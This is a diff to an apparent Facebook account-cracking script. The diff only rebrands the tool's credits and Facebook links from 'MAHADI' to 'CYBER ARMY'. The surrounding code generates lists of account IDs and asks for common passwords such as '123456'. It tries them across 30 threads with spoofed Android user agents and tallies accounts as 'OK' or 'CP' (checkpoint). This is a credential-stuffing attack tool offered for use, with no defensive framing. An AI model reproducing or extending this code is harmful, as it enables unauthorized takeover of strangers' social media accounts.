@@ -44,8 +44,8 @@ def runtxt(z):
 
 def helpnote():
 	print("%s [*] FOLLOW ME ON Fb TU KNOW ABOUT UPDATES  :)"%(G))
-	subprocess.check_output(["am", "start", "https://www.facebook.com/4FR1D1.143"])
-	exit(" [*] FACEBOOK :  https://www.facebook.com/4FR1D1.143")
+	subprocess.check_output(["am", "start", "https://www.facebook.com/Cyber.Army0033"])
+	exit(" [*] FACEBOOK :  https://www.facebook.com/Cyber.Army0033")
 
 
 def notice():
@@ -54,8 +54,8 @@ def notice():
 
 	runtxt("\n\033[0;91m YOU ARE NOT PREMIUM USER ")
 	runtxt("\033[0;93m SEND THIS KEY TO ADMIN >> %s%s"%(G,basesplit))
-	runtxt("\033[0;92m ADMIN FACEBOOK >> MAHADI HASAN AFRIDI")
-	subprocess.check_output(["am", "start", "https://www.facebook.com/4FR1D1.143"])
+	runtxt("\033[0;92m ADMIN FACEBOOK >> CYBER ARMY")
+	subprocess.check_output(["am", "start", "https://www.facebook.com/Cyber.Army0033"])
 
 
         
@@ -242,7 +242,7 @@ class Main:
 				self.id.append(__+str(_))
 			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
 			with ThreadPoolExecutor(max_workers=30) as coeg:
-				print("\n%s [!] USE %s, %s(COMMA)%s FOR MAHADI  "%(Y,G,B,Y))
+				print("\n%s [!] USE %s, %s(COMMA)%s FOR CYBER ARMY  "%(Y,G,B,Y))
 				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))
 				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
 				if len(listpass)<=5:
@@ -272,7 +272,7 @@ class Main:
 				self.id.append(__+str(_))
 			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
 			with ThreadPoolExecutor(max_workers=30) as coeg:
-				print("\n%s [!] USE %s, %s(COMMA)%s FOR MAHIDI "%(Y,G,B,Y))
+				print("\n%s [!] USE %s, %s(COMMA)%s FOR CYBER ARMY "%(Y,G,B,Y))
 				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G)) 
 				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
 				if len(listpass)<=5:
@@ -335,7 +335,7 @@ class Main:
 				self.id.append(___+str(_)+__)
 			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
 			with ThreadPoolExecutor(max_workers=30) as coeg:
-				print("\n%s [!] USE %s, %s(COMMA)%s FOR MAHADI "%(Y,G,B,Y))
+				print("\n%s [!] USE %s, %s(COMMA)%s FOR CYBER ARMY "%(Y,G,B,Y))
 				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G)) 
 				listpass = input(" [?] ENTER PASSWORD : ")
 				if len(listpass)<=5:
@@ -385,7 +385,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
 		sys.stdout.write(
-			"\r\r %s\033[0;93m[>_] [MAHADI] : \033[0;97m %s/%s -> \033[0;92m [MAHADI -OK:%s ]- \033[0;93m[MAHADI-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
+			"\r\r %s\033[0;93m [CYBER] : \033[0;97m %s/%s -> \033[0;92m [CYBER -OK:%s ]- \033[0;93m[CYBER-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
